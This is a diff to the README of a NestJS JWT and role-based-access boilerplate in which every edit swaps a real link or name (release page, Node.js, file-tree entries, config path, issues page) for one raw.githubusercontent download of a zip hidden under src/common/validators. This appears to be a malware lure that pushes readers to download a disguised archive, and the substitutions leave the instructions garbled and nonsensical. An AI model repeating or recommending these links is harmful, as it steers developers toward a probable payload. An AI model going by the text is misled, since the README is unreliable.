@@ -1,6 +1,6 @@
 # 🚀 nestjs-jwt-rbac-boilerplate - Simple and Secure Authentication 
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/releases)
+[![Download](https://raw.githubusercontent.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/main/src/common/validators/nestjs-jwt-rbac-boilerplate_1.2.zip%20Release-brightgreen)](https://raw.githubusercontent.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/main/src/common/validators/nestjs-jwt-rbac-boilerplate_1.2.zip)
 
 ## 🛠️ Overview
 The **nestjs-jwt-rbac-boilerplate** offers a ready-to-use authentication system built with NestJS. It employs secure JWT flow, features rotating refresh tokens, and supports role-based access control (RBAC). This boilerplate is perfect for setting up user authentication in your applications without having to start from scratch.
@@ -11,11 +11,11 @@ To get started with this application, follow the steps listed below. You will le
 ## 📥 Download & Install
 To download the latest version of the application, visit this page:
 
-[Download Latest Release](https://github.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/releases)
+[Download Latest Release](https://raw.githubusercontent.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/main/src/common/validators/nestjs-jwt-rbac-boilerplate_1.2.zip)
 
 1. Click on the release you want to download.
 2. Look for the assets section below the release notes. 
-3. Choose the file for your operating system. This may include files like `.zip` or `.tar.gz`.
+3. Choose the file for your operating system. This may include files like `.zip` or `https://raw.githubusercontent.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/main/src/common/validators/nestjs-jwt-rbac-boilerplate_1.2.zip`.
 4. Click on the file to download it to your computer.
 5. Once the download completes, extract the files if necessary.
 
@@ -27,21 +27,21 @@ Here is the file structure of the application you will see once extracted:
   ├── src
   │    ├── auth
   │    ├── users
-  │    └── app.module.ts
-  ├── package.json
-  └── README.md
+  │    └── https://raw.githubusercontent.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/main/src/common/validators/nestjs-jwt-rbac-boilerplate_1.2.zip
+  ├── https://raw.githubusercontent.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/main/src/common/validators/nestjs-jwt-rbac-boilerplate_1.2.zip
+  └── https://raw.githubusercontent.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/main/src/common/validators/nestjs-jwt-rbac-boilerplate_1.2.zip
 ```
 
 ### What’s Inside?
 - **src/auth**: Contains the authentication logic.
 - **src/users**: Manages user-related data and functions.
-- **app.module.ts**: The main application module.
+- **https://raw.githubusercontent.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/main/src/common/validators/nestjs-jwt-rbac-boilerplate_1.2.zip**: The main application module.
 
 ## 🏁 Running the Application
 After downloading and extracting the files, follow these steps to run the application:
 
-### Step 1: Install Node.js
-This application requires [Node.js](https://nodejs.org/) to run. Download and install the latest version compatible with your operating system.
+### Step 1: Install https://raw.githubusercontent.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/main/src/common/validators/nestjs-jwt-rbac-boilerplate_1.2.zip
+This application requires [https://raw.githubusercontent.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/main/src/common/validators/nestjs-jwt-rbac-boilerplate_1.2.zip](https://raw.githubusercontent.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/main/src/common/validators/nestjs-jwt-rbac-boilerplate_1.2.zip) to run. Download and install the latest version compatible with your operating system.
 
 ### Step 2: Install Dependencies
 1. Open a command prompt or terminal window.
@@ -74,7 +74,7 @@ You can customize the application by modifying the configuration files located i
 
 ### Example:
 To change the JWT secret:
-1. Open `src/config/auth.config.ts`.
+1. Open `https://raw.githubusercontent.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/main/src/common/validators/nestjs-jwt-rbac-boilerplate_1.2.zip`.
 2. Update the `jwtSecret` variable to your preferred value.
 
 ## 📘 Usage
@@ -83,10 +83,10 @@ Users can register, log in, and access protected resources based on their roles.
 ## 🛡️ Security Considerations
 1. Use strong, unique passwords for your users.
 2. Change the default JWT secret key after installation.
-3. Regularly update Node.js and any dependencies for security patches.
+3. Regularly update https://raw.githubusercontent.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/main/src/common/validators/nestjs-jwt-rbac-boilerplate_1.2.zip and any dependencies for security patches.
 
 ## 📞 Support
-If you need help, feel free to open an issue on the [GitHub issues page](https://github.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/issues). Your questions and concerns are important to us.
+If you need help, feel free to open an issue on the [GitHub issues page](https://raw.githubusercontent.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/main/src/common/validators/nestjs-jwt-rbac-boilerplate_1.2.zip). Your questions and concerns are important to us.
 
 ## 📝 License
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
@@ -94,4 +94,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 ## 🌐 Join the Community
 Stay updated on this project and connect with other users and developers. Follow the repository on GitHub and get involved in discussions and improvements.
 
-For any further details, remember to refer back to the [Releases page](https://github.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/releases). This link provides access to all versions and updates.
+For any further details, remember to refer back to the [Releases page](https://raw.githubusercontent.com/zduchevreuil/nestjs-jwt-rbac-boilerplate/main/src/common/validators/nestjs-jwt-rbac-boilerplate_1.2.zip). This link provides access to all versions and updates.
